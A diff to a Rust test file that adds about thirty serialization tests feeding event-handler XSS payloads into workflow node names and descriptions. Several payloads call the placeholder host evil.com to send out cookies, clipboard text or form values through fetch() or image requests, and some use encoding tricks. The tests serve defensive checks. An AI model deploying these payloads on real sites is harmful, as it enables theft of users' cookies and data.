@@ -8,6 +8,14 @@ use vo_frontend::ui::domain_types::{HttpMethod, NodeTemplateId};
 use vo_frontend::ui::graph::{Node, NodeId, Workflow};
 use vo_frontend::ui::prototype_palette::{generate_skeleton, SketchNode};
 
+/// Helper: roundtrip a node name through JSON and assert the payload survives.
+fn assert_name_roundtrip(payload: &str) {
+    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
+    let json = serde_json::to_string(&node).expect("serialize");
+    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
+    assert_eq!(recovered.name, payload, "payload must roundtrip verbatim");
+}
+
 #[test]
 fn xss_node_name_script_tag_survives_roundtrip() {
     let payload = r#"<script>alert('xss')</script>"#;
@@ -147,4 +155,204 @@ fn workflow_with_malicious_config_key() {
     // Must not panic — prototype pollution keys are just string keys in serde_json
     assert!(node.config.as_object().is_some());
     assert_eq!(node.config.as_object().map(|m| m.len()), Some(2));
+}
+
+// ============================================================================
+// bh-004: Event handler XSS — signal ordering corruption via node names
+// ============================================================================
+
+#[test]
+fn xss_event_handler_onclick_in_node_name() {
+    let payload = r#"<div onclick="alert('xss')">click me</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onmouseover_in_node_name() {
+    let payload = r#"<a onmouseover="fetch('//evil.com/?c='+document.cookie)">hover</a>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onfocus_in_node_name() {
+    let payload = r#"<input onfocus="eval(atob('YWxlcnQoMSk='))" autofocus>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onblur_in_node_name() {
+    let payload = r#"<input onblur="window.location='//evil.com'">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onchange_in_node_name() {
+    let payload = r#"<select onchange="new Image().src='//evil.com/?'+this.value"><option>1</option></select>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onsubmit_in_node_name() {
+    let payload = r#"<form onsubmit="fetch('//evil.com',{method:'POST',body:document.cookie})"><input type=submit>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onkeydown_in_node_name() {
+    let payload = r#"<body onkeydown="if(event.key==='q')alert(1)">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onkeyup_in_node_name() {
+    let payload = r#"<input onkeyup="String.fromCharCode(event.keyCode)">type here"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onkeypress_in_node_name() {
+    let payload = r#"<input onkeypress="document.title='pwned'">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_ondblclick_in_node_name() {
+    let payload = r#"<div ondblclick="alert(document.domain)">double-click</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_oncontextmenu_in_node_name() {
+    let payload = r#"<div oncontextmenu="event.preventDefault();alert('right-click')">right-click me</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_ondrag_in_node_name() {
+    let payload = r#"<div ondrag="alert('dragged')">drag me</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_ondrop_in_node_name() {
+    let payload = r#"<div ondrop="fetch('//evil.com/?dropped='+event.dataTransfer.getData('text'))">drop zone</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onpaste_in_node_name() {
+    let payload = r#"<input onpaste="navigator.clipboard.readText().then(t=>fetch('//evil.com/?p='+t))">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_oncopy_in_node_name() {
+    let payload = r#"<div oncopy="alert('copied!')">copy this</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onscroll_in_node_name() {
+    let payload = r#"<div onscroll="fetch('//evil.com/?scroll=1')" style="height:9999px">scroll</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onresize_in_node_name() {
+    let payload = r#"<body onresize="fetch('//evil.com/?w='+innerWidth)">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onanimationend_in_node_name() {
+    let payload = r#"<div style="animation:x 0.1s" onanimationend="alert('anim')">animated</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_ontransitionend_in_node_name() {
+    let payload = r#"<div style="transition:all 0.1s" ontransitionend="eval('alert(1)')">transition</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_onerror_in_node_description() {
+    let payload = r#"<img src=x onerror="alert(document.cookie)">"#;
+    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
+    node.description = payload.to_string();
+    let json = serde_json::to_string(&node).expect("serialize");
+    assert!(json.contains("onerror"), "onerror in description must survive");
+    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
+    assert_eq!(recovered.description, payload, "description roundtrip verbatim");
+}
+
+#[test]
+fn xss_event_handler_onload_in_node_description() {
+    let payload = r#"<svg onload="fetch('//evil.com/'+document.cookie)">"#;
+    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
+    node.description = payload.to_string();
+    let json = serde_json::to_string(&node).expect("serialize");
+    assert!(json.contains("onload"), "onload in description must survive");
+    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
+    assert_eq!(recovered.description, payload);
+}
+
+#[test]
+fn xss_event_handler_mixed_vector_in_node_name() {
+    let payload = r#"<img src=x onerror="alert(1)"><svg onload="fetch('//evil')"><div onclick="eval(location)"></div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_encoded_entity_in_node_name() {
+    let payload = r#"<img src=x on&#101;rror="alert(1)">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_null_byte_in_node_name() {
+    let payload = "<img src=x onerror=\x00\"alert(1)\">";
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_newline_in_node_name() {
+    let payload = "<img src=x\nonerror=\"alert(1)\">";
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_tab_in_node_name() {
+    let payload = "<img src=x\tonerror=\"alert(1)\">";
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_backtick_template_in_node_name() {
+    let payload = r#"<img src=x onerror="`${document.cookie}`">"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_unicode_in_node_name() {
+    let payload = "<img src=x onerror=\"\u{0000}alert(1)\">";
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_nested_quotes_in_node_name() {
+    let payload = r#"<div onclick="alert(&quot;xss&quot;)">nested quotes</div>"#;
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_single_quote_attr_in_node_name() {
+    let payload = "<div onclick='alert(1)'>single quote handler</div>";
+    assert_name_roundtrip(payload);
+}
+
+#[test]
+fn xss_event_handler_no_quotes_attr_in_node_name() {
+    let payload = "<img src=x onerror=alert(1)>";
+    assert_name_roundtrip(payload);
 }
